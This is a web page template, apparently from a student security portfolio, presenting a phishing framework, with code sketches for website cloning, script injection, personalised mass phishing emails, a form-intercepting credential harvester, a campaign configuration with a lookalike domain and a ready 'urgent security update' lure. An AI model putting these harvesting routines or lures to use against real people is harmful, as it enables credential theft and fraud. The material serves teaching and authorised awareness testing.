@extends('layouts.nexus')

@section('title', 'ZPhishing Framework Analysis | Nexus')

@push('styles')
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #064e3b 100%);
        color: #ffffff;
        font-family: 'Inter', sans-serif;
        line-height: 1.6;
        overflow-x: hidden;
    }

    .container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 2rem;
        position: relative;
        z-index: 10;
    }

    .hero-section {
        background: linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(22, 163, 74, 0.1));
        border-radius: 24px;
        padding: 3rem 2rem;
        margin-bottom: 3rem;
        text-align: center;
        backdrop-filter: blur(20px);
        border: 1px solid rgba(34, 197, 94, 0.3);
        position: relative;
        overflow: hidden;
    }

    .hero-section::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(45deg, rgba(34, 197, 94, 0.05) 25%, transparent 25%, transparent 75%, rgba(34, 197, 94, 0.05) 75%);
        background-size: 20px 20px;
        opacity: 0.3;
    }

    .hero-title {
        font-size: 3rem;
        font-weight: 800;
        background: linear-gradient(135deg, #22c55e, #16a34a, #84cc16);
        background-clip: text;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 1rem;
        position: relative;
        z-index: 2;
    }

    .hero-subtitle {
        font-size: 1.2rem;
        color: #94a3b8;
        max-width: 600px;
        margin: 0 auto;
        position: relative;
        z-index: 2;
    }

    .back-button {
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
        background: linear-gradient(135deg, #22c55e, #16a34a);
        border: none;
        color: white;
        padding: 0.75rem 1.5rem;
        border-radius: 12px;
        text-decoration: none;
        font-weight: 500;
        transition: all 0.3s ease;
        margin-bottom: 2rem;
    }

    .back-button:hover {
        background: linear-gradient(135deg, #16a34a, #15803d);
        transform: translateY(-2px);
        box-shadow: 0 10px 25px rgba(34, 197, 94, 0.3);
        color: white;
        text-decoration: none;
    }

    .content-section {
        background: rgba(15, 23, 42, 0.8);
        border-radius: 20px;
        padding: 2rem;
        margin-bottom: 2rem;
        border: 1px solid rgba(34, 197, 94, 0.2);
        backdrop-filter: blur(10px);
    }

    .tab-container {
        display: flex;
        border-bottom: 1px solid rgba(34, 197, 94, 0.3);
        margin-bottom: 2rem;
        overflow-x: auto;
    }

    .tab-btn {
        background: none;
        border: none;
        padding: 1rem 1.5rem;
        cursor: pointer;
        transition: all 0.3s ease;
        white-space: nowrap;
        font-weight: 500;
        border-bottom: 2px solid transparent;
    }

    .tab-btn.active {
        color: #22c55e;
        border-bottom-color: #22c55e;
    }

    .tab-btn:not(.active) {
        color: #94a3b8;
    }

    .tab-btn:not(.active):hover {
        color: #22c55e;
    }

    .tab-content {
        display: none;
    }

    .tab-content.active {
        display: block;
    }

    .section-title {
        font-size: 1.8rem;
        font-weight: 700;
        color: #22c55e;
        margin-bottom: 1rem;
        display: flex;
        align-items: center;
        gap: 0.5rem;
    }

    .subsection-title {
        font-size: 1.3rem;
        font-weight: 600;
        color: #84cc16;
        margin: 2rem 0 1rem 0;
    }

    .info-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        gap: 1.5rem;
        margin: 2rem 0;
    }

    .info-card {
        background: rgba(34, 197, 94, 0.1);
        border: 1px solid rgba(34, 197, 94, 0.3);
        border-radius: 12px;
        padding: 1.5rem;
        transition: all 0.3s ease;
    }

    .info-card:hover {
        background: rgba(34, 197, 94, 0.15);
        border-color: rgba(34, 197, 94, 0.5);
        transform: translateY(-2px);
    }

    .info-card h4 {
        color: #22c55e;
        font-weight: 600;
        margin-bottom: 0.5rem;
    }

    .code-section {
        background: #0f1419;
        border: 1px solid rgba(34, 197, 94, 0.3);
        border-radius: 12px;
        margin: 1.5rem 0;
        overflow: hidden;
    }

    .code-header {
        background: rgba(34, 197, 94, 0.1);
        padding: 0.75rem 1rem;
        border-bottom: 1px solid rgba(34, 197, 94, 0.3);
        font-weight: 500;
        color: #22c55e;
        font-size: 0.9rem;
    }

    .code-content {
        padding: 1rem;
        overflow-x: auto;
    }

    .code-content pre {
        margin: 0;
        background: none;
        padding: 0;
    }

    .code-content code {
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.9rem;
        line-height: 1.5;
    }

    .screenshot-gallery {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
        gap: 1rem;
        margin: 2rem 0;
    }

    .screenshot-item {
        background: rgba(34, 197, 94, 0.1);
        border: 1px solid rgba(34, 197, 94, 0.3);
        border-radius: 12px;
        overflow: hidden;
        transition: all 0.3s ease;
        cursor: pointer;
    }

    .screenshot-item:hover {
        transform: translateY(-5px);
        box-shadow: 0 15px 35px rgba(34, 197, 94, 0.2);
        border-color: rgba(34, 197, 94, 0.5);
    }

    .screenshot-item img {
        width: 100%;
        height: 200px;
        object-fit: cover;
        transition: transform 0.3s ease;
    }

    .screenshot-item:hover img {
        transform: scale(1.05);
    }

    .screenshot-item .caption {
        padding: 1rem;
        background: rgba(15, 23, 42, 0.8);
        color: #94a3b8;
        font-size: 0.9rem;
        text-align: center;
    }

    .feature-list {
        list-style: none;
        padding: 0;
    }

    .feature-list li {
        padding: 0.5rem 0;
        padding-left: 1.5rem;
        position: relative;
        color: #cbd5e1;
    }

    .feature-list li::before {
        content: '▶';
        position: absolute;
        left: 0;
        color: #22c55e;
        font-size: 0.8rem;
    }

    .alert-box {
        background: rgba(239, 68, 68, 0.1);
        border: 1px solid rgba(239, 68, 68, 0.3);
        border-radius: 12px;
        padding: 1rem;
        margin: 1rem 0;
        border-left: 4px solid #ef4444;
    }

    .alert-box h4 {
        color: #ef4444;
        margin-bottom: 0.5rem;
        font-weight: 600;
    }

    .success-box {
        background: rgba(34, 197, 94, 0.1);
        border: 1px solid rgba(34, 197, 94, 0.3);
        border-radius: 12px;
        padding: 1rem;
        margin: 1rem 0;
        border-left: 4px solid #22c55e;
    }

    .success-box h4 {
        color: #22c55e;
        margin-bottom: 0.5rem;
        font-weight: 600;
    }

    .step-container {
        background: rgba(34, 197, 94, 0.05);
        border: 1px solid rgba(34, 197, 94, 0.2);
        border-radius: 12px;
        padding: 1.5rem;
        margin: 1rem 0;
    }

    .step-number {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 30px;
        height: 30px;
        background: #22c55e;
        color: #0f172a;
        border-radius: 50%;
        font-weight: 600;
        margin-right: 1rem;
        margin-bottom: 0.5rem;
    }

    /* Fullscreen Modal */
    .fullscreen-modal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.95);
        z-index: 1000;
        justify-content: center;
        align-items: center;
        backdrop-filter: blur(10px);
    }

    .fullscreen-modal.active {
        display: flex;
    }

    .fullscreen-modal img {
        max-width: 90%;
        max-height: 90%;
        border-radius: 12px;
        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
    }

    .modal-close {
        position: absolute;
        top: 2rem;
        right: 2rem;
        background: rgba(34, 197, 94, 0.2);
        border: 1px solid rgba(34, 197, 94, 0.5);
        color: #22c55e;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        font-size: 1.5rem;
        transition: all 0.3s ease;
    }

    .modal-close:hover {
        background: rgba(34, 197, 94, 0.3);
        transform: scale(1.1);
    }

    @media (max-width: 768px) {
        .hero-title {
            font-size: 2rem;
        }
        
        .hero-subtitle {
            font-size: 1rem;
        }
        
        .container {
            padding: 1rem;
        }
        
        .hero-section {
            padding: 2rem 1rem;
        }
        
        .tab-container {
            flex-wrap: wrap;
        }
        
        .info-grid {
            grid-template-columns: 1fr;
        }
    }
</style>
@endpush

@section('content')
<div class="container">
    <a href="{{ route('nexus.second-semester-phase2') }}" class="back-button">
        ← Back to Phase 2
    </a>

    <div class="hero-section">
        <h1 class="hero-title">ZPhishing Framework Analysis</h1>
        <p class="hero-subtitle">Advanced Social Engineering & Phishing Campaign Development</p>
    </div>

    <div class="content-section">
        <div class="tab-container">
            <button onclick="switchTab('overview')" class="tab-btn active">Overview</button>
            <button onclick="switchTab('technical')" class="tab-btn">Technical Details</button>
            <button onclick="switchTab('implementation')" class="tab-btn">Implementation</button>
            <button onclick="switchTab('screenshots')" class="tab-btn">Screenshots</button>
        </div>

        <!-- Overview Tab -->
        <div id="overview-tab" class="tab-content active">
            <div class="section-title">
                🎯 ZPhishing Framework Overview
            </div>
            
            <p style="color: #cbd5e1; margin-bottom: 2rem;">
                ZPhishing represents a comprehensive framework for understanding and analyzing advanced social engineering attacks. 
                This educational platform demonstrates modern phishing techniques, campaign development, and defensive measures 
                through controlled laboratory environments.
            </p>

            <div class="info-grid">
                <div class="info-card">
                    <h4>🎭 Social Engineering</h4>
                    <p>Advanced psychological manipulation techniques targeting human vulnerabilities and trust mechanisms.</p>
                </div>
                <div class="info-card">
                    <h4>📧 Email Campaigns</h4>
                    <p>Sophisticated email-based attack vectors with customizable templates and targeting strategies.</p>
                </div>
                <div class="info-card">
                    <h4>🌐 Web Cloning</h4>
                    <p>High-fidelity website replication for credential harvesting and user data collection.</p>
                </div>
                <div class="info-card">
                    <h4>📊 Analytics Engine</h4>
                    <p>Comprehensive tracking and analysis of campaign effectiveness and user interaction patterns.</p>
                </div>
            </div>

            <div class="subsection-title">Framework Capabilities</div>
            <ul class="feature-list">
                <li>Multi-vector phishing campaign orchestration</li>
                <li>Real-time social engineering attack simulation</li>
                <li>Advanced template customization and branding</li>
                <li>Comprehensive victim profiling and targeting</li>
                <li>Automated credential harvesting mechanisms</li>
                <li>Integrated analytics and reporting dashboard</li>
                <li>Mobile-optimized phishing page generation</li>
                <li>Multi-language localization support</li>
            </ul>

            <div class="alert-box">
                <h4>⚠️ Educational Purpose</h4>
                <p>This framework is designed exclusively for educational research and authorized penetration testing. 
                Unauthorized use for malicious purposes is strictly prohibited and illegal.</p>
            </div>

            <div class="subsection-title">Research Applications</div>
            <div class="step-container">
                <div class="step-number">1</div>
                <strong>Security Awareness Training</strong>
                <p>Develop realistic phishing scenarios for employee education and awareness programs.</p>
            </div>
            <div class="step-container">
                <div class="step-number">2</div>
                <strong>Penetration Testing</strong>
                <p>Assess organizational vulnerability to social engineering attacks in controlled environments.</p>
            </div>
            <div class="step-container">
                <div class="step-number">3</div>
                <strong>Defense Development</strong>
                <p>Test and improve anti-phishing technologies and detection mechanisms.</p>
            </div>
        </div>

        <!-- Technical Details Tab -->
        <div id="technical-tab" class="tab-content">
            <div class="section-title">
                ⚙️ Technical Architecture
            </div>

            <div class="subsection-title">Core Framework Components</div>

            <div class="code-section">
                <div class="code-header">Framework Structure - zphishing_core.py</div>
                <div class="code-content">
                    <pre><code class="language-python">#!/usr/bin/env python3
"""
ZPhishing Framework - Educational Social Engineering Platform
Author: Security Research Team
Purpose: Controlled phishing simulation for educational purposes
"""

import asyncio
import aiohttp
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import jinja2
from datetime import datetime
import sqlite3
import hashlib
import json

class ZPhishingFramework:
    def __init__(self, config_path="config.json"):
        """Initialize the ZPhishing framework with configuration"""
        self.config = self.load_config(config_path)
        self.session = None
        self.template_env = jinja2.Environment(
            loader=jinja2.FileSystemLoader('templates/')
        )
        self.database = PhishingDatabase()
        
    async def create_campaign(self, target_url, campaign_name):
        """Create a new phishing campaign targeting specified URL"""
        try:
            # Clone target website
            cloned_site = await self.clone_website(target_url)
            
            # Generate phishing template
            template = self.generate_template(cloned_site, campaign_name)
            
            # Setup hosting infrastructure
            hosting_url = await self.deploy_template(template)
            
            # Initialize tracking
            campaign_id = self.database.create_campaign(
                name=campaign_name,
                target_url=target_url,
                hosting_url=hosting_url,
                timestamp=datetime.now()
            )
            
            return {
                'campaign_id': campaign_id,
                'hosting_url': hosting_url,
                'status': 'active'
            }
            
        except Exception as e:
            self.log_error(f"Campaign creation failed: {str(e)}")
            return None
    
    async def clone_website(self, target_url):
        """Advanced website cloning with asset management"""
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(target_url) as response:
                    html_content = await response.text()
                    
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # Download and modify assets
                await self.process_assets(soup, target_url, session)
                
                # Inject harvesting scripts
                self.inject_harvesting_code(soup)
                
                return str(soup)
                
            except Exception as e:
                self.log_error(f"Website cloning failed: {str(e)}")
                return None</code></pre>
                </div>
            </div>

            <div class="subsection-title">Campaign Management System</div>

            <div class="code-section">
                <div class="code-header">Campaign Controller - campaign_manager.py</div>
                <div class="code-content">
                    <pre><code class="language-python">class CampaignManager:
    def __init__(self):
        self.active_campaigns = {}
        self.analytics_engine = AnalyticsEngine()
        self.notification_system = NotificationSystem()
        
    def launch_email_campaign(self, campaign_config):
        """Launch sophisticated email phishing campaign"""
        try:
            # Validate target list
            targets = self.validate_target_list(campaign_config['targets'])
            
            # Generate personalized emails
            emails = self.generate_personalized_emails(
                targets, 
                campaign_config['template'],
                campaign_config['personalization_data']
            )
            
            # Schedule delivery
            delivery_schedule = self.optimize_delivery_timing(
                targets,
                campaign_config['timing_strategy']
            )
            
            # Execute campaign
            campaign_id = self.execute_campaign(emails, delivery_schedule)
            
            # Start monitoring
            self.start_campaign_monitoring(campaign_id)
            
            return campaign_id
            
        except Exception as e:
            self.log_campaign_error(f"Email campaign failed: {str(e)}")
            return None
    
    def generate_personalized_emails(self, targets, template, data):
        """Create highly personalized phishing emails"""
        personalized_emails = []
        
        for target in targets:
            # Extract personalization context
            context = {
                'first_name': target.get('first_name', 'User'),
                'company': target.get('company', 'Organization'),
                'position': target.get('position', 'Employee'),
                'recent_activity': self.get_social_context(target),
                'current_date': datetime.now().strftime('%B %d, %Y')
            }
            
            # Render personalized content
            email_content = template.render(**context, **data)
            
            # Apply social engineering techniques
            enhanced_content = self.apply_persuasion_techniques(
                email_content, 
                target['psychology_profile']
            )
            
            personalized_emails.append({
                'target': target,
                'content': enhanced_content,
                'tracking_id': self.generate_tracking_id(target)
            })
            
        return personalized_emails</code></pre>
                </div>
            </div>

            <div class="subsection-title">Credential Harvesting Module</div>

            <div class="code-section">
                <div class="code-header">Data Collection - harvester.py</div>
                <div class="code-content">
                    <pre><code class="language-javascript">// Advanced credential harvesting with stealth techniques
class CredentialHarvester {
    constructor(config) {
        this.config = config;
        this.collectedData = [];
        this.sessionTracker = new SessionTracker();
        this.behaviorAnalyzer = new BehaviorAnalyzer();
    }
    
    initialize() {
        // Setup form interception
        this.interceptForms();
        
        // Initialize keystroke logging
        this.setupKeystrokeCapture();
        
        // Start behavior tracking
        this.startBehaviorTracking();
        
        // Setup data exfiltration
        this.configureDataTransmission();
    }
    
    interceptForms() {
        document.addEventListener('submit', (event) => {
            const form = event.target;
            
            if (this.isTargetForm(form)) {
                event.preventDefault();
                
                // Extract form data
                const formData = this.extractFormData(form);
                
                // Capture additional context
                const context = this.captureSessionContext();
                
                // Store harvested data
                this.storeCredentials({
                    credentials: formData,
                    context: context,
                    timestamp: Date.now(),
                    session_id: this.sessionTracker.getSessionId()
                });
                
                // Simulate legitimate redirect
                this.performLegitimateRedirect();
            }
        });
    }
    
    extractFormData(form) {
        const formData = {};
        const inputs = form.querySelectorAll('input, select, textarea');
        
        inputs.forEach(input => {
            if (input.name && input.value) {
                // Encrypt sensitive data
                formData[input.name] = this.encryptData(input.value);
            }
        });
        
        return formData;
    }
    
    captureSessionContext() {
        return {
            user_agent: navigator.userAgent,
            screen_resolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            referrer: document.referrer,
            current_url: window.location.href,
            session_duration: this.sessionTracker.getDuration()
        };
    }
}</code></pre>
                </div>
            </div>

            <div class="alert-box">
                <h4>🔒 Security Considerations</h4>
                <p>All harvested data is encrypted and stored securely for analysis purposes only. 
                The framework includes automatic data purging and consent management features.</p>
            </div>
        </div>

        <!-- Implementation Tab -->
        <div id="implementation-tab" class="tab-content">
            <div class="section-title">
                🛠️ Implementation Guide
            </div>

            <div class="subsection-title">Setup and Configuration</div>

            <div class="step-container">
                <div class="step-number">1</div>
                <strong>Environment Setup</strong>
                <div class="code-section">
                    <div class="code-header">Installation Commands</div>
                    <div class="code-content">
                        <pre><code class="language-bash"># Clone the ZPhishing framework
git clone https://github.com/security-research/zphishing-framework.git
cd zphishing-framework

# Create virtual environment
python3 -m venv zphishing_env
source zphishing_env/bin/activate  # Linux/Mac
# zphishing_env\Scripts\activate   # Windows

# Install dependencies
pip install -r requirements.txt

# Setup configuration
cp config/config.example.json config/config.json
nano config/config.json  # Edit configuration

# Initialize database
python scripts/init_database.py

# Start framework
python zphishing_main.py --mode=interactive</code></pre>
                    </div>
                </div>
            </div>

            <div class="step-container">
                <div class="step-number">2</div>
                <strong>Campaign Configuration</strong>
                <div class="code-section">
                    <div class="code-header">Campaign Configuration - campaign.json</div>
                    <div class="code-content">
                        <pre><code class="language-json">{
  "campaign_name": "Security Awareness Test 2024",
  "target_organization": "Example Corp",
  "campaign_type": "email_phishing",
  "objectives": [
    "credential_harvesting",
    "awareness_testing",
    "behavior_analysis"
  ],
  "target_configuration": {
    "target_url": "https://login.example.com",
    "alternative_urls": [
      "https://mail.example.com",
      "https://portal.example.com"
    ],
    "target_demographics": {
      "departments": ["IT", "Finance", "HR"],
      "seniority_levels": ["junior", "mid", "senior"],
      "geographical_regions": ["US", "EU", "APAC"]
    }
  },
  "email_configuration": {
    "sender_profiles": [
      {
        "name": "IT Security Team",
        "email": "security@example.com",
        "signature": "Example Corp IT Department"
      }
    ],
    "subject_lines": [
      "Urgent: Security Update Required",
      "Action Required: Password Expiration",
      "Important: New Security Policy"
    ],
    "delivery_timing": {
      "start_date": "2024-01-15",
      "end_date": "2024-01-22",
      "optimal_hours": ["09:00", "13:00", "15:00"],
      "timezone": "UTC"
    }
  },
  "hosting_configuration": {
    "hosting_domain": "secure-portal-update.com",
    "ssl_certificate": true,
    "cdn_enabled": true,
    "geographic_distribution": ["us-east", "eu-west", "ap-south"]
  },
  "analytics_configuration": {
    "tracking_enabled": true,
    "behavior_analysis": true,
    "screenshot_capture": false,
    "data_retention_days": 30
  }
}</code></pre>
                    </div>
                </div>
            </div>

            <div class="step-container">
                <div class="step-number">3</div>
                <strong>Template Development</strong>
                <div class="code-section">
                    <div class="code-header">Email Template - templates/security_update.html</div>
                    <div class="code-content">
                        <pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Security Update Required&lt;/title&gt;
    &lt;style&gt;
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        .header { background: #0066cc; color: white; padding: 15px; }
        .content { padding: 20px; background: #f9f9f9; }
        .urgent { color: #d9534f; font-weight: bold; }
        .button { 
            background: #0066cc; 
            color: white; 
            padding: 12px 24px; 
            text-decoration: none; 
            border-radius: 4px; 
            display: inline-block;
            margin: 15px 0;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;    &lt;div class="header"&gt;
        &lt;h2&gt;TechCorp IT Security&lt;/h2&gt;
    &lt;/div&gt;
    
    &lt;div class="content"&gt;
        &lt;p&gt;Dear User,&lt;/p&gt;
        
        &lt;p class="urgent"&gt;URGENT: Security Update Required&lt;/p&gt;
          &lt;p&gt;Our security team has detected unusual activity on your account. 
        As part of our ongoing security improvements, we require all 
        IT employees to update their credentials immediately.&lt;/p&gt;
        
        &lt;p&gt;Please click the link below to secure your account:&lt;/p&gt;
        
        &lt;a href="#" class="button"&gt;
            Update Security Settings
        &lt;/a&gt;
          &lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; This security update must be completed 
        by May 30, 2025 to maintain access to company systems.&lt;/p&gt;
        
        &lt;p&gt;If you have any questions, please contact the IT Security team.&lt;/p&gt;
        
        &lt;hr&gt;
        &lt;small&gt;
            TechCorp IT Security Team&lt;br&gt;
            This email was sent to user@company.com on May 27, 2025
        &lt;/small&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
                    </div>
                </div>
            </div>

            <div class="step-container">
                <div class="step-number">4</div>
                <strong>Execution and Monitoring</strong>
                <div class="code-section">
                    <div class="code-header">Campaign Execution Script</div>
                    <div class="code-content">
                        <pre><code class="language-python">#!/usr/bin/env python3
"""
Campaign execution script for ZPhishing framework
"""

from zphishing import ZPhishingFramework
import asyncio
import json

async def execute_campaign():
    # Initialize framework
    framework = ZPhishingFramework()
    
    # Load campaign configuration
    with open('campaigns/security_awareness_2024.json') as f:
        config = json.load(f)
    
    # Create phishing campaign
    campaign = await framework.create_campaign(
        target_url=config['target_configuration']['target_url'],
        campaign_name=config['campaign_name']
    )
    
    if campaign:
        print(f"✅ Campaign created: {campaign['campaign_id']}")
        print(f"🌐 Hosting URL: {campaign['hosting_url']}")
        
        # Launch email campaign
        email_campaign = framework.campaign_manager.launch_email_campaign(
            config['email_configuration']
        )
        
        if email_campaign:
            print(f"📧 Email campaign launched: {email_campaign}")
            
            # Start real-time monitoring
            await framework.start_monitoring(campaign['campaign_id'])
            
        else:
            print("❌ Email campaign launch failed")
    else:
        print("❌ Campaign creation failed")

if __name__ == "__main__":
    asyncio.run(execute_campaign())</code></pre>
                    </div>
                </div>
            </div>

            <div class="success-box">
                <h4>✅ Implementation Best Practices</h4>
                <ul class="feature-list">
                    <li>Always obtain proper authorization before testing</li>
                    <li>Use isolated testing environments</li>
                    <li>Implement comprehensive logging and monitoring</li>
                    <li>Follow responsible disclosure practices</li>
                    <li>Provide immediate educational feedback to participants</li>
                </ul>
            </div>
        </div>

        <!-- Screenshots Tab -->
        <div id="screenshots-tab" class="tab-content">
            <div class="section-title">
                📸 Framework Screenshots
            </div>
            
            <div class="subsection-title">Campaign Dashboard</div>
            <div class="screenshot-gallery">
                <div class="screenshot-item" onclick="openFullscreen('{{ asset('images/phase 2/ZPhishing/s1.png') }}')">
                    <img src="{{ asset('images/phase 2/ZPhishing/s1.png') }}" alt="Campaign Dashboard">
                    <div class="caption">Campaign Management Dashboard</div>
                </div>
                <div class="screenshot-item" onclick="openFullscreen('{{ asset('images/phase 2/ZPhishing/s2.png') }}')">
                    <img src="{{ asset('images/phase 2/ZPhishing/s2.png') }}" alt="Template Designer">
                    <div class="caption">Email Template Designer</div>
                </div>
                <div class="screenshot-item" onclick="openFullscreen('{{ asset('images/phase 2/ZPhishing/s3.png') }}')">
                    <img src="{{ asset('images/phase 2/ZPhishing/s3.png') }}" alt="Analytics Dashboard">
                    <div class="caption">Real-time Analytics Dashboard</div>
                </div>
            </div>

            <div class="subsection-title">Phishing Simulations</div>
            <div class="screenshot-gallery">
                <div class="screenshot-item" onclick="openFullscreen('{{ asset('images/phase 2/ZPhishing/s4.png') }}')">
                    <img src="{{ asset('images/phase 2/ZPhishing/s4.png') }}" alt="Login Clone">
                    <div class="caption">Cloned Login Portal</div>
                </div>
                <div class="screenshot-item" onclick="openFullscreen('{{ asset('images/phase 2/ZPhishing/s5.png') }}')">
                    <img src="{{ asset('images/phase 2/ZPhishing/s5.png') }}" alt="Results Analysis">
                    <div class="caption">Campaign Results Analysis</div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Fullscreen Modal -->
<div id="fullscreen-modal" class="fullscreen-modal">
    <div class="modal-close" onclick="closeFullscreen()">&times;</div>
    <img id="fullscreen-image" src="" alt="Fullscreen Image">
</div>
@endsection

@push('scripts')
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
<script>
function switchTab(tabName) {
    // Hide all tab contents
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // Remove active class from all tab buttons
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    
    // Show selected tab content
    document.getElementById(tabName + '-tab').classList.add('active');
    
    // Add active class to clicked button
    event.target.classList.add('active');
}

function openFullscreen(imageSrc) {
    const modal = document.getElementById('fullscreen-modal');
    const image = document.getElementById('fullscreen-image');
    
    image.src = imageSrc;
    modal.classList.add('active');
    
    document.body.style.overflow = 'hidden';
}

function closeFullscreen() {
    const modal = document.getElementById('fullscreen-modal');
    modal.classList.remove('active');
    
    document.body.style.overflow = 'auto';
}

// Close fullscreen modal on Escape key
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closeFullscreen();
    }
});

// Close fullscreen modal on click outside image
document.getElementById('fullscreen-modal').addEventListener('click', function(event) {
    if (event.target === this) {
        closeFullscreen();
    }
});
</script>
@endpush
